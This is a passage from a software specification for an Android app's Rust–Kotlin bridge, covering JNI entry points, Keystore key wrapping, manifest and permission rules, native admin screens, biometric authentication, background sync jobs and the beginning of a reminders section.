Before `open` succeeded, `request` answers `503 bridge/not_open` (§6.5), `call` and `callSecret` answer `bridge/not_open`, `changes` and `waitForChange` answer `{"ok": false, "code": "bridge/not_open"}` (`waitForChange` after sleeping its timeout, so the watcher does not spin), and `picture` answers `""`. A second `open` while open answers the current mode with `"already": true` and opens nothing.

- **BRIDGE-JNI-001** (android-shell) `libtaskdeck.so` MUST export exactly the nine entry points of §11.2, with those names and Java signatures, and `JNI_OnLoad`.
- **BRIDGE-JNI-002** (android-shell) Every entry point MUST return a valid JSON text of the shape §11.2 gives, for every input, including after `open` failed or before it ran.
- **BRIDGE-JNI-003** (android-shell) Strings MUST cross JNI without loss for every Unicode scalar value, those above U+FFFF included, in both directions; a Java string with an unpaired surrogate MUST be answered with `bridge/bad_text` and no other effect.
- **BRIDGE-JNI-004** (android) `callSecret` MUST copy the code bytes into a `Zeroizing` buffer, overwrite the Java array with zeros before it returns, and pass the code to the facade only as `zeroize::Zeroizing<String>`.

### 11.3 Configuration and result of `open`

**`config`**:

| Field | Type | Required | Constraints | Meaning |
|---|---|---|---|---|
| `data_dir` | string | required | absolute path, 1 to 4,096 bytes | `<Context.getFilesDir()>/taskdeck_data` (`device.md` §5.1) |
| `api` | integer | required | 26 to 1,000 | `Build.VERSION.SDK_INT`; becomes `Platform::Android { api }` |
| `build_id` | string | required | 1 to 64 bytes | `BuildConfig.VERSION_NAME` |
| `device_name` | string | required | `seal.md` §5.5 | `Settings.Global.getString(cr, "device_name")`, else `Build.MODEL`, cut to that limit at a scalar boundary; becomes `default_device_name` |
| `trust` | string | required | `"platform"` or `"bundled"` | §12.6; becomes `TrustRoots` |
| `zone` | object | required | §12.7 | becomes `ZoneSource::Table` |

The key store passed to `Device::open` is `AndroidKeyStore` (§11.5), built from `data_dir`.

**Result**: on success `{"ok": true, "mode": "local" | "synced" | "key_lost", "warnings": [<code>…], "identity": {"board_id": hex32, "dev": hex32, "device_name": string, "relay_address": string or null, "key_fp": string or null} or null}`, with `warnings` the `OpenWarning` variants in snake case (`folder_locked`, `torn_tail`, …); on failure `{"ok": false, "code": "<device code>", "message": string or null}`. The `echo` backend answers `{"ok": true, "mode": "echo", "warnings": [], "identity": null}`.

### 11.4 The `call` table

The administration and platform surface. Only the shell calls it, from native screens, jobs and receivers; the page cannot reach it (BRIDGE-ROUTE-003). Arguments are strict JSON objects (BRIDGE-GEN-004); `hex32` is 32 lowercase hex characters. "Auth" rows run only through `AdminClient.authed` (§13.2). "API 30" rows are refused below API 30 by the facade (`device/needs_api30`, DEV-FACADE-007) and are not offered by the screens there.

| Name | Arguments | `value` | Facade (`device.md`) | Auth | Stage |
|---|---|---|---|---|---|
| `status` | `{}` | `DeviceStatus` (§11.4.1) | `status()` | — | android |
| `set_foreground` | `{"visible": bool}` | `null` | `set_foreground` | — | android |
| `notify_resume` | `{}` | `null` | `notify_resume` | — | android |
| `set_zone` | `{"zone": <§12.7>}` | `null` | `set_zone` | — | android |
| `background_sync` | `{"budget_ms": 1..600000}` | `{"synced": bool, "queued": int, "head": int}` | `background_sync` | — | android |
| `reminders` | `{"from_ms": int, "until_ms": int}` | array of §15.2's records | `Published::reminders` | — | android |
| `submit_intent` | `{"intent": string}` (one of §15.5's intents) | `{"ok": true, "version": int}` | `submit_json` | — | android |
| `set_weather_place` | `{"source": "home"}` or `{"source": "own", "lat": -9000..9000, "lon": -18000..18000}` | `null` | `set_weather_place` | — | android-shell (echo), android |
| `set_reminder_leads` | `{"event": 0..1440, "block": 0..1440, "due": 0..1440}` | `null` | `set_reminder_leads` | — | android |
| `ack_banner` | `{"seq": int, "index": 0..255}` | `null` | `ack_banner((seq, index))` | — | android |
| `dismiss_alarm` | `{"id": int}` | `null` | `dismiss_alarm` | — | android |
| `confirm_clock` | `{}` | `null` | `confirm_clock` | — | android |
| `confirm_rejoin` | `{}` | `null` | `confirm_rejoin` | — | android |
| `ack_continuity` | `{}` | `null` | `ack_continuity` | — | android |
| `ack_restored_copy` | `{}` | `null` | `ack_restored_copy` | — | android |
| `ack_based_on_unchecked` | `{}` | `null` | `ack_based_on_unchecked` | — | android |
| `use_this_copy` | `{}` | `null` | `use_this_copy` | auth, API 30 | android |
| `adopt` | `{"dev": hex32, "typed_fp": string}` | ticket | `adopt` | auth, API 30 | android |
| `skip` | `{"seq": int}` | ticket (int) | `skip` | auth, API 30 | android |
| `revoke` | `{"dev": hex32, "replace": bool}` | ticket | `revoke` | auth, API 30 | android |
| `pair_start` | `{}` | `{"address_display": string, "code_display": string}` | `pair_start` | auth, API 30 | android |
| `pair_confirm` | `{}` | `null` | `pair_confirm` | —, API 30 | android |
| `pair_cancel` | `{}` | `null` | `pair_cancel` | — | android |
| `join_sas` | `{"digits": 6 ASCII digits}` | `null` | `join_sas` | — | android |
| `enter_move_code` | `{"text": 1..64 bytes}` | `null` | `enter_move_code` | — | android |
| `follow_address` | `{"address": 1..512 bytes, "code": 1..64 bytes}` | ticket | `follow_address` | — | android |
| `wait_op` | `{"ticket": int, "timeout_ms": 1..60000}` | `null` (timeout), `{"ok": true}` or `{"ok": false, "code": string}` | `wait_op` | — | android |
| `ops` | `{}` | array of `{"ticket", "kind", "stage", "started_ms"}` | `ops` | — | android |
| `identities` | `{}` | array of `{"board_id": hex32, "dev": hex32, "key_store": int, "created_ms": int, "active": bool}` | `identities()` | — | android |
| `forget_identity` | `{"board": hex32, "dev": hex32}` | `null` | `forget_identity` | auth, API 30 | android |
| `callSecret` `join` | `{"address": 1..512 bytes, "device_name": string}` + code | `null` | `join` | — | android |
| `callSecret` `re_pair` | as `join` | `null` | `re_pair` | — | android |

The `echo` backend answers `set_weather_place` (into its state) and answers every other name with `bridge/not_in_echo`. An unknown name is `bridge/call_unknown`. A facade error is `{"ok": false, "code": <its code>, "message": <its message or the code>}`.

- **BRIDGE-JNI-005** (android) `call` MUST accept exactly the names of §11.4, MUST check each one's arguments as its row states before calling the facade, and MUST answer `bridge/call_unknown` for any other name.

#### 11.4.1 Serialising facade values

`DeviceStatus`, `Status` and the types inside them cross as JSON by one rule: a struct is an object whose members are its fields in snake case; an `Option` that is `None` is an absent member; a unit enum variant is its name in snake case as a string; a data variant is `{"<variant in snake case>": {…its fields…}}`; `[u8; N]` and `Vec<u8>` are lowercase hex; integers are JSON integers (all are below 2^53, README §5.3); strings are strings. The field names are `engine.md` §30.1's and `device.md` §25's.

- **BRIDGE-JNI-006** (android) Facade values MUST cross `call` serialised by the rule of §11.4.1.

### 11.5 Callbacks into Kotlin: the key vault

The only calls from Rust into Java besides the platform verifier's own (which its Android component makes from the TLS threads). `AndroidKeyStore` (in `taskdeck-android`, `backend-device`) implements `taskdeck_device::KeyStore` (`device.md` §12.1, §12.5) with `kind() = 3`:

| Trait method | Does |
|---|---|
| `create(board, dev, key)` | `KeyVault.wrap(alias, AD_L, key)`; on status 0 creates `<data_dir>/sync/` and `<data_dir>/sync/id-<board hex>-<dev hex>/` when they are missing (`create_dir`, then `sync_dir` of its parent, for each), then writes the 60 returned bytes as `ld.wrap` in that directory: `ld.wrap.tmp`, `sync`, `rename`, `sync_dir` |
| `load(board, dev)` | reads `ld.wrap`: missing is `NotFound`; a length other than 60 is `CannotUnwrap`; else `KeyVault.unwrap(alias, AD_L, wrap)` |
| `delete(board, dev)` | `KeyVault.delete(alias)`, then removes `ld.wrap` and calls `sync_dir`; a missing `ld.wrap` is not an error |

`alias` is `taskdeck.ld.<board hex>.<dev hex>`; `AD_L` is `device.md` §12.1's associated data. The Kotlin side:

| `KeyVault` method (`@JvmStatic`) | Returns (`ByteArray`) |
|---|---|
| `wrap(alias: String, ad: ByteArray, key: ByteArray)` | status byte, then on status 0 `iv[12] ‖ ciphertext[32] ‖ tag[16]` (61 bytes in all) |
| `unwrap(alias: String, ad: ByteArray, wrap: ByteArray)` | status byte, then on status 0 the 32 key bytes (33 bytes in all) |
| `delete(alias: String)` | the status byte alone |

Status bytes: `0` ok; `1` not found (the alias is missing) → `NotFound`; `2` cannot unwrap (`AEADBadTagException`, `KeyPermanentlyInvalidatedException`, `UnrecoverableKeyException`) → `CannotUnwrap`; `3` unavailable (a `KeyStoreException` or `ProviderException` while `UserManager.isUserUnlocked()` is false) → `Unavailable`; `4` failed (anything else, a Java exception left pending, a result of the wrong length) → `Failed`. The key parameters are §12.5's.

**Threading.** `Device::open` calls `load` on its calling thread (`lifecycle`, or a job or receiver worker); `create`, `delete` and any other `load` run on the device's sync thread (`device.md` §12.1). Every trait method first attaches its thread to the JVM with `JavaVM::attach_current_thread_as_daemon` when it is not attached. After each call Rust checks for a pending Java exception, clears it, and maps it to `Failed`.

**Secrets.** Rust passes `key` in a new Java `ByteArray` and overwrites it with zeros (`SetByteArrayRegion`) after the call; it copies the result of `unwrap` into `Zeroizing` and overwrites that Java array with zeros. Kotlin overwrites with zeros every `ByteArray` it made that held key bytes (the plaintext given to `Cipher.doFinal`, the result of `doFinal` in `unwrap`) before returning (BRIDGE-GEN-007).

- **BRIDGE-KEY-001** (android) `AndroidKeyStore` MUST implement the three trait methods exactly as the table of §11.5 states, with the alias and associated data given there.
- **BRIDGE-KEY-002** (android) `AndroidKeyStore` MUST map the key vault's status bytes to `KeyStoreError` as §11.5 states, and MUST map a pending Java exception to `Failed` after clearing it.
- **BRIDGE-KEY-003** (android-shell) The key vault and `AndroidKeyStore` MUST overwrite with zeros every array that held key bytes, on both sides of the call, before the call returns.
- **BRIDGE-KEY-005** (android) Every trait method of `AndroidKeyStore` MUST attach its calling thread to the JVM as a daemon thread when it is not attached, before its first JNI call.

### 11.6 Panics, exceptions and threading

| Entry point | On a caught panic |
|---|---|
| `request` | `{"status": 500, "body": {"error": "TaskDeck hit a fault and did not do that."}}` |
| `picture` | `""` |
| every other | `{"ok": false, "code": "bridge/panic"}` |

The panic's message is never included (it may hold data). The backend stays usable after a caught panic. No entry point leaves a Java exception pending when it returns. Every entry point may be called from any Java thread; the facade is `Clone + Send + Sync` (`device.md` §4.5), and `PageFacade` and the backend are too.

- **BRIDGE-JNI-007** (android-shell) A panic inside any entry point MUST be caught and answered as the table of §11.6 states, and MUST NOT include the panic's message.
- **BRIDGE-JNI-008** (android-shell) An entry point MUST NOT return while a Java exception is pending.

## 12. Android platform rules

### 12.1 SDK levels, ABIs and pages

| Item | Value |
|---|---|
| application id | `app.taskdeck.phone` (`full`); `app.taskdeck.phone.echo` (`echo`); the rehearsal APK of SYNC_PLAN.md §6.10 item 7 uses `app.taskdeck.phone.rehearsal`. The Kotlin package is `app.taskdeck.phone` in all three. |
| `minSdk` | 26 (Android 8.0), unless `android-shell` proves a blocker and records it (SYNC_PLAN.md §2, §6.6 item 7) |
| `targetSdk` | 36 |
| `compileSdk` | 37 |
| Android Gradle plugin | 9.5, the exact patch release pinned by `android-shell` in `android/gradle/libs.versions.toml` |
| NDK | 28.2.13676358 |
| `cargo-ndk` | 4.1.2, with `--platform 26` |
| JDK for Gradle | 17 or later (the container has 21) |
| ABIs | `arm64-v8a` (`aarch64-linux-android`), `armeabi-v7a` (`armv7-linux-androideabi`), `x86_64` (`x86_64-linux-android`, for the emulator) |
| APK | one universal APK holding all three ABIs; no splits, no bundle |
| page size | 16 KB: every `LOAD` segment of each `libtaskdeck.so` aligned to at least `0x4000` (NDK r28's default, also passed as `-C link-arg=-Wl,-z,max-page-size=16384`); `packaging.jniLibs.useLegacyPackaging = false`; the APK passes `zipalign -c -P 16 4` |
| Rust profile | the workspace's `release` profile with `panic = "unwind"` (SYNC.md §8: `catch_unwind` at every JNI entry) |

Build variants: `echoDebug` (`android-shell`'s tests, `--no-default-features --features backend-echo`), `echoTiming` and `fullTiming` (the timing harness, §16: built as release, with R8 and the optimised Rust profile, signed with the debug key, never published; each with its flavour's features), `fullDebug` (the default features, so `backend-device`, and `taskdeck-device` with `test-trust` for the end-to-end tests against a relay on loopback, reached through `adb reverse`), `fullRelease` (the default features, so `backend-device`, without `test-trust`; the only variant `release` builds and the only one a phone runs). `echoRelease` does not exist.

- **BRIDGE-PLAT-001** (android-shell) The app MUST build with the levels, tools and ABIs of §12.1, and CI MUST check every `LOAD` segment of each ABI's `libtaskdeck.so` for an alignment of at least `0x4000` and the APK with `zipalign -c -P 16 4`.
- **BRIDGE-PLAT-002** (android-shell) The `armeabi-v7a` build MUST link, in CI, on every pull request that changes `android/` or `crates/taskdeck-android/`.

### 12.2 Permissions

Exactly these, in the manifest (SYNC.md §2.1, with the calendar permissions dropped together with the export, and two additions marked):

| Permission | Why |
|---|---|
| `android.permission.INTERNET` | the device runtime's connections to the relay, ICS hosts and Open-Meteo (from Rust, BRIDGE-GEN-008) |
| `android.permission.ACCESS_NETWORK_STATE` | (added) the default-network callback that calls `notify_resume` (§14.1), and jobs with a network constraint |
| `android.permission.POST_NOTIFICATIONS` | reminders and sync problems; asked at run time on API 33 and later, once, the first time `MainActivity` starts with the core open (the `shell` preference `notifications_asked`), and again only from the Health screen |
| `android.permission.USE_EXACT_ALARM` | the reminder chain on API 33 and later (granted at install) |
| `android.permission.SCHEDULE_EXACT_ALARM`, `android:maxSdkVersion="32"` | the reminder chain on API 31 and 32 (V3-13) |
| `android.permission.RECEIVE_BOOT_COMPLETED` | rescheduling the alarm chain after a reboot; the persisted periodic job |
| `android.permission.USE_BIOMETRIC` | BIOMETRIC_STRONG before "auth" calls (§13.2) |
| `android.permission.ACCESS_COARSE_LOCATION` | (on demand) "Use my location" (§6.4.5); asked at run time only from that request |

- **BRIDGE-PERM-001** (android-shell) The merged manifest of `fullRelease` MUST request exactly the eight permissions of §12.2, with `SCHEDULE_EXACT_ALARM` limited by `android:maxSdkVersion="32"`, and CI MUST check the merged manifest of the built APK against that list.

### 12.3 The manifest

- `<application android:allowBackup="false" android:fullBackupContent="@xml/backup_none" android:dataExtractionRules="@xml/extraction_none" android:usesCleartextTraffic="false" android:networkSecurityConfig="@xml/network_security" android:hasFragileUserData="false">`.
- `res/xml/backup_none.xml` (Android 11 and lower): `<full-backup-content>` with `<exclude domain="…" path="."/>` for each of `root`, `file`, `database`, `sharedpref`, `external`, `device_root`, `device_file`, `device_database`, `device_sharedpref`.
- `res/xml/extraction_none.xml` (Android 12 and later): `<data-extraction-rules>` with `<cloud-backup>`, `<device-transfer>` and `<cross-platform-transfer platform="ios">`, each excluding the same nine domains (R2 §7: on some makers `allowBackup="false"` alone does not stop device-to-device transfer).
- `res/xml/network_security.xml`: `<network-security-config><base-config cleartextTrafficPermitted="false"><trust-anchors><certificates src="system"/></trust-anchors></base-config></network-security-config>` (no user-installed authorities).
- Exported components: `MainActivity` (exported, with only the `MAIN`/`LAUNCHER` filter) and `SystemReceiver` (exported; its filter names `android.intent.action.BOOT_COMPLETED`, `android.intent.action.LOCKED_BOOT_COMPLETED`, `android.intent.action.MY_PACKAGE_REPLACED`, `android.intent.action.TIME_SET`, `android.intent.action.TIMEZONE_CHANGED`, `android.app.action.SCHEDULE_EXACT_ALARM_PERMISSION_STATE_CHANGED`; `onReceive` returns at once for any other action). Every other component has `android:exported="false"`; `SyncJobService` carries `android:permission="android.permission.BIND_JOB_SERVICE"`.
- Every activity carries `android:taskAffinity=""`; `MainActivity` is `launchMode="singleTask"`.
- `PairActivity` sets `WindowManager.LayoutParams.FLAG_SECURE` on its window (the code and the SAS are on screen; SYNC.md §5.6: code screens exclude capture).
- Every `PendingIntent` is made with an explicit component and `FLAG_IMMUTABLE`.
- The meta-data of §9.2.

- **BRIDGE-MAN-001** (android-shell) The release manifest MUST set `allowBackup="false"`, `fullBackupContent` and `dataExtractionRules` excluding every domain as §12.3 states, `usesCleartextTraffic="false"` and the network security configuration of §12.3.
- **BRIDGE-MAN-002** (android-shell) Only `MainActivity` and `SystemReceiver` MUST be exported, and `SystemReceiver` MUST ignore every action not in its list.
- **BRIDGE-MAN-003** (android-shell) Every `PendingIntent` the app creates MUST be explicit and carry `FLAG_IMMUTABLE`.

### 12.4 Dependencies and their verification

| Where | Dependencies |
|---|---|
| app, run time | `org.jetbrains.kotlin:kotlin-stdlib`; `androidx.webkit:webkit:1.18.0` and its transitive set (`androidx.core` and the rest, each listed in the verification metadata, V3-16); the platform verifier's Android component (`rustls-platform-verifier-android`, the version `rustls-platform-verifier` 0.7.1 requires), vendored as an AAR under `android/vendor/` with its SHA-256 recorded (SYNC_PLAN.md §3.4) |
| app, tests | `junit:junit`, `androidx.test:runner`, `androidx.test:rules`, `androidx.test.ext:junit`, `androidx.test.uiautomator:uiautomator`, `androidx.test.espresso:espresso-core`, `androidx.test.espresso:espresso-web` |
| `taskdeck-android` | `jni` 0.22.4, `serde`, `serde_json`, `base64`, `sha2`, `zeroize`; with `backend-device` (the default feature, §11.1) also `taskdeck-core`, `taskdeck-device`, `chrono` (for `PageFacade::answer_snapshot` and `PageFacade::today`, §21), `rustls-platform-verifier` (for its Android initialiser); all at the workspace's pins |

No Firebase, Play services, WorkManager, CameraX, Compose, AppCompat or Material (SYNC.md §2.1). Gradle verifies every artifact, plugins included, against `android/gradle/verification-metadata.xml` (SHA-256), and the wrapper carries `distributionSha256Sum`.

- **BRIDGE-DEP-001** (android-shell) The app's run-time dependency set MUST be exactly that of §12.4, and the build MUST fail when any artifact's SHA-256 is missing from or differs from the verification metadata.

### 12.5 The Keystore key

`KeyVault.wrap`, when the alias is absent, generates the key with `KeyGenerator.getInstance("AES", "AndroidKeyStore")` and `KeyGenParameterSpec.Builder(alias, PURPOSE_ENCRYPT or PURPOSE_DECRYPT)` with `setKeySize(256)`, `setBlockModes(BLOCK_MODE_GCM)`, `setEncryptionPaddings(ENCRYPTION_PADDING_NONE)`, `setRandomizedEncryptionRequired(true)`, `setUserAuthenticationRequired(false)` (jobs and reminders run while the phone is locked, SYNC.md §5.6), no `setUnlockedDeviceRequired`, and `setIsStrongBoxBacked(true)` when `PackageManager.FEATURE_STRONGBOX_KEYSTORE` is present (API 28 and later), generating again without it on `StrongBoxUnavailableException`. Encryption is `Cipher.getInstance("AES/GCM/NoPadding")` initialised without an IV (the Keystore draws the 12-byte IV, read back with `cipher.iv`), `updateAAD(ad)`, then `doFinal` of the 32 key bytes (48 bytes out: 32 of ciphertext and the 16-byte tag). Decryption initialises with `GCMParameterSpec(128, iv)`. The 60-byte wrap lives in the identity directory as `ld.wrap` (`device.md` §6.1, §12.5), in app-private storage under the backup exclusions of §12.3.

- **BRIDGE-KEY-004** (android-shell) The key vault MUST generate the Keystore key with exactly the parameters of §12.5 and MUST NOT bind it to user authentication.

### 12.6 Trust roots per API level

The device verifies the relay's certificate with the platform verifier (`TrustRoots::Platform`) or with `webpki-roots` (`TrustRoots::Bundled`), chosen per run by the shell (`device.md` §10.1). Decided here, for `android-shell` to confirm and record in its status file:

| API level | `trust` | Why |
|---|---|---|
| 26 to 33 | `bundled` | these releases' system authority store is updated only with the whole system, which old phones no longer get, so roots added since their release are missing |
| 34 and later | `platform` | the system authority store is updated through the Conscrypt module |

`android-shell` confirms the split with an instrumented test at API 26 and at API 36 that opens a TLS connection from Rust, with each choice, to a host whose chain ends in a current public root, and records the results; a failure of the `platform` choice at a level of 34 or above moves that level to `bundled` in this table through a spec-change pull request.

- **BRIDGE-TRUST-001** (android-shell) The shell MUST pass `trust` as §12.6's table states for the running API level.

### 12.7 The zone

The shell hands the device the platform's zone as a `TableZone` (`core.md` §5.2, `device.md` §16), built from `java.time.ZoneId.systemDefault().rules` (in the platform since API 26):

1. `start = now − 400 × 86,400,000 ms`, `end = now + 800 × 86,400,000 ms`.
2. `initial = rules.getOffset(start).totalSeconds`.
3. From `t = start`, repeatedly `tr = rules.nextTransition(t)`; while `tr` is not `null` and `tr.instant < end`: append `[tr.instant.toEpochMilli(), tr.offsetAfter.totalSeconds]`, `t = tr.instant`.
4. JSON: `{"initial": int, "transitions": [[int, int], …]}`, at most 256 transitions, strictly ascending, every offset within −86,399 to 86,399; else `bridge/zone` and the previous zone stays.

It is sent in the `open` configuration, and by `set_zone` at every `MainActivity.onStart`, on `TIMEZONE_CHANGED` and `TIME_SET`, and at the start of every job run.

- **BRIDGE-ZONE-001** (android) The shell MUST build the zone by the four steps of §12.7 and MUST hand it to the device at `open` and at each of the events §12.7 names.

## 13. Native screens and administration from the phone

### 13.1 What the phone does

The native screens are plain framework views (no AppCompat, no Compose, §12.4) over `call("status", {})` and the calls of §11.4. They refresh on the watcher's `status`, `banners` and `pairing` counters.

| Screen | Shows | Offers (the `call` used) | Needs |
|---|---|---|---|
| Devices | the sync state in full (session, last synced, unreachable since, paused until, queued, the request count when above 4,000), the sync fingerprint (`engine.fingerprint`), this device's key fingerprint, the device list (name, short key fingerprint, status, last seen = the later of `last_beat_ms` and `last_entry_ms`; never an alarm, V2-10) | — | all |
| Devices: banners | each unacknowledged banner with its author's name and key fingerprint | Acknowledge (`ack_banner`) | all |
| Devices: alarms | each alarm with its evidence, as text | Dismiss (`dismiss_alarm`) for one that does not stop the engine; the stop's action: `ConfirmRejoin` (`confirm_rejoin`), `RePair` (opens Pair in re-pair mode), `Adopt` (type the fingerprint, `adopt`), `UseThisCopy` (`use_this_copy`); `RestoreTail`, `ReHome`, `ReplaceDevice` show "Do this from a desktop."; `Restart` shows "Close TaskDeck and open it again."; `Wait` shows the stop's kind | `Adopt`, `UseThisCopy`: API 30 and auth |
| Devices: rejoin | while `status().engine.stops` holds the stop of kind `Rejoin` (`engine.md` §19.7 step 1), the line "This device was away longer than the relay keeps its history. Rebuild it from the newest checked snapshot? Changes not yet sent stay queued and are sent after the rebuild." | Rebuild (`confirm_rejoin`) | all |
| Devices: the clock | the skew when `clock.warning` | Confirm the clock (`confirm_clock`) | all |
| Devices: continuity | `ContinuityUnchecked { from }` of `status().warnings`, with its seq | Acknowledge (`ack_continuity`) | all |
| Devices: restored copy | `RestoredCopy { entries }` of `status().warnings`, with its count | Acknowledge (`ack_restored_copy`) | all |
| Devices: unchecked history | `BasedOnUnchecked { count }` of `status().warnings`, with its count | Acknowledge (`ack_based_on_unchecked`) | all |
| Devices: the halted view | the halt's kind, since when, the entry's author and key fingerprint, the Skip offer | Skip (`skip`) when `skip_offer.here` | API 30 and auth |
| Devices: add a device | — | Add a device (`pair_start`, then the address and code shown, then the SAS shown, then `pair_confirm`; `pair_cancel`) | API 30 and auth |
| Devices: per device | — | Remove (`revoke` with `replace: false`), Replace (`revoke` with `replace: true`) | API 30 and auth |
| Devices: moving | `moving` (host, tries left, locked until) | Enter the move code (`enter_move_code`), Follow an address (`follow_address`) | all |
| Devices: reminders | the three leads | Change (`set_reminder_leads`) | all |
| Devices: a lost key | the old identity (the `identities()` entry with `active`, key lost, `device.md` §12.6) | Forget the old copy (`forget_identity`; the phone then opens as an unpaired phone, `device.md` §17.2) | API 30 and auth |
| Devices: old copies | every `identities()` entry that is not `active` (board, device id, created) | Forget (`forget_identity`) | API 30 and auth |
| Pair | the join flow: relay address, code, device name; then the SAS entry; progress from `status().pairing` | Join (`callSecret join`), re-pair (`callSecret re_pair`), digits (`join_sas`), Cancel (`pair_cancel`) | all |
| Health | notifications enabled (`NotificationManager.areNotificationsEnabled`), exact alarms (`AlarmManager.canScheduleExactAlarms`, API 31 and later), battery optimisation (`PowerManager.isIgnoringBatteryOptimizations`), the standby bucket (`UsageStatsManager.appStandbyBucket`, API 28 and later), the WebView version | Notification settings; the app's battery settings (`ACTION_APPLICATION_DETAILS_SETTINGS`); on a phone whose `Build.MANUFACTURER` is `samsung` in any case, "Never sleeping apps" (action `com.samsung.android.sm.ACTION_OPEN_CHECKABLE_LISTACTIVITY`, package `com.samsung.android.lool`, extra `activity_type` = 2, falling back to `ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS`) | all |

Below API 30 the rows that need it are shown with the text "This needs Android 11 or later. Use a desktop." and no button.

**Desktop-only** (SYNC_PLAN.md §2, `device.md` §17): restore to a point, purge history, reset trust, recovery-key changes, moving the board (starting it), creating a board, backups, the shared picture's upload, rules overrides, managing subscriptions, the palette and the home place. The phone offers none of them and the `call` table has none of them.

- **BRIDGE-SCREEN-001** (android) The native screens MUST offer exactly the actions of §13.1's table, each only where its "Needs" column allows, and MUST offer none of the desktop-only operations.
- **BRIDGE-SCREEN-002** (android) While `status().engine.stops` holds a stop of kind `Rejoin`, the Devices screen MUST show the line "This device was away longer than the relay keeps its history. Rebuild it from the newest checked snapshot? Changes not yet sent stay queued and are sent after the rebuild." with a button "Rebuild" that calls `confirm_rejoin`.

### 13.2 Authentication

`AdminClient.authed(activity, name, args)` runs every `call` that §11.4 marks "auth":

1. Below API 30: refused before anything runs; the screens do not offer it (§13.1).
2. `BiometricManager.canAuthenticate(BIOMETRIC_STRONG)` is not `BIOMETRIC_SUCCESS`: the screen says "This needs a fingerprint or face unlock of the strongest kind. Set one up in the phone's settings, or use a desktop." and nothing runs.
3. A framework `android.hardware.biometrics.BiometricPrompt` with `setAllowedAuthenticators(BIOMETRIC_STRONG)` (no `DEVICE_CREDENTIAL`: no PIN fallback, SYNC.md §5.3, V1-5), `setConfirmationRequired(true)`, the title "Confirm it is you" and a negative button "Cancel".
4. On `onAuthenticationSucceeded`, the call runs at once, once; an error or a cancel runs nothing. A success older than 30,000 ms is not used.

- **BRIDGE-AUTH-001** (android) Every `call` marked "auth" in §11.4 MUST run only within 30,000 ms after a `BiometricPrompt` success that allowed only `BIOMETRIC_STRONG`, and at most once per success.

### 13.3 The code field

The Pair screen's pairing-code field (SYNC.md §5.3 step 3) is `CodeField`, a subclass of `EditText`:

- `inputType = TYPE_CLASS_TEXT or TYPE_TEXT_VARIATION_VISIBLE_PASSWORD or TYPE_TEXT_FLAG_NO_SUGGESTIONS`;
- `imeOptions` includes `IME_FLAG_NO_PERSONALIZED_LEARNING`;
- `importantForAutofill = IMPORTANT_FOR_AUTOFILL_NO_EXCLUDE_DESCENDANTS`;
- `isLongClickable = false`, `setTextIsSelectable(false)`, `customSelectionActionModeCallback` and `customInsertionActionModeCallback` whose `onCreateActionMode` returns `false`;
- `onTextContextMenuItem` ignores `android.R.id.paste`, `pasteAsPlainText`, `copy`, `cut` and `selectAll` and returns `true`;
- an `InputFilter` that rejects every edit inserting more than one character at once (so a paste through the keyboard's clipboard strip is refused; typing inserts one at a time);
- on Join the screen reads the text with `Editable.getChars` into a `CharArray`, encodes it to UTF-8 into a `ByteArray`, calls `callSecret`, then overwrites both arrays with zeros and clears the `Editable`.

The relay-address field is a plain text field without suggestions that accepts paste (ruling S4); the device name field is plain text. The SAS field takes 6 digits (`TYPE_CLASS_NUMBER`) with the same paste and learning rules as `CodeField`.

- **BRIDGE-CODE-001** (android) The code field MUST offer no suggestions, no personalised learning, no autofill and no clipboard, by every rule of §13.3.
- **BRIDGE-CODE-002** (android) The relay-address field MUST accept a pasted address.

## 14. Background work

### 14.1 While visible

`MainActivity.onStart`: on `lifecycle`, `set_zone` then `set_foreground(true)` (the device opens its socket, `device.md` §10.9), and registers `ConnectivityManager.registerDefaultNetworkCallback`, whose `onAvailable` calls `notify_resume` (the backoff is bypassed once, SYNC.md §4.9). `MainActivity.onStop`: `set_foreground(false)` (the device closes the socket), unregisters the callback, and schedules the leaving job when `status.engine.queued > 0`. No foreground service exists; no socket is kept in the background (R2 §3, DEV-NET-013).

### 14.2 Jobs

| Job | Id | `JobInfo` | Budget for `background_sync` | Scheduled |
|---|---|---|---|---|
| periodic | 1 | `setPeriodic(1,800,000)`, `setRequiredNetworkType(NETWORK_TYPE_ANY)`, `setPersisted(true)` | 300,000 ms | after each successful `open`, when `JobScheduler.getPendingJob(1)` is `null` |
| leaving | 2 | API 31 and later: `setExpedited(true)`, `setRequiredNetworkType(NETWORK_TYPE_ANY)`; API 26 to 30: `setRequiredNetworkType(NETWORK_TYPE_ANY)` alone (expedited jobs need API 31, V3-13) | 120,000 ms | at `onStop` with queued edits, replacing a pending job 2 |

`SyncJobService.onStartJob` hands the run to a worker thread and returns `true`. The worker, in order: `ensureOpen` (`Locked` or `Failed`: `jobFinished(params, true)` and stop); `set_zone`; `background_sync(budget)`; the reminder reschedule (§15.3); the sync-problem check (§15.7); `jobFinished(params, false)`. `onStopJob` returns `true`; the worker's call ends by its own budget. A background run fetches feeds and weather only when stale (`device.md` §13), and takes whatever duties fall to the phone (ruling S8).

What is promised (SYNC.md §4.9): edits leave within a minute of leaving the app on API 31 and later when the system grants the expedited job; pulls happen about every 30 minutes outside Doze; in Doze or One UI's sleeping lists, only "fresh on open" until `android` measures more on the owner's phone. There is no freshness alarm: the only alarms are the reminder chain (§15), so no alarm takes the Doze budget of one allow-while-idle alarm per 9 minutes away from a reminder (V3-13).

- **BRIDGE-BG-001** (android) The app MUST schedule exactly the two jobs of §14.2 with those parameters, and each run MUST call `background_sync` with the job's budget.
- **BRIDGE-BG-002** (android) The app MUST NOT start a foreground service, and MUST NOT schedule any alarm other than the reminder chain of §15.
- **BRIDGE-BG-003** (android) `MainActivity` MUST call `set_foreground(true)` in `onStart` and `set_foreground(false)` in `onStop`, and MUST call `notify_resume` when the default network becomes available while it is started.

## 15. Reminders

Reminders are computed in the core (`core.md` §14.5, `Published::reminders` with the leads of `device.tdk`, `device.md` §16, ruling S19), scheduled by the shell as a chain of single exact alarms, verified before they notify, and work with no network (SYNC.md §4.9, R2 §5). They are `android`'s (SYNC_PLAN.md §2: not a cutover gate).

### 15.1 Words

- **Window** of a firing at time `t`: `[t, t + 540,000)` ms. Reminders less than 9 minutes apart therefore arrive in one firing, up to 9 minutes early (folded forward: the Doze budget allows one allow-while-idle alarm per 9 minutes, R2 §3).
- **Notified**: a reminder key that has been posted, kept with its `fire_ms` for 24 hours.

### 15.2 The records

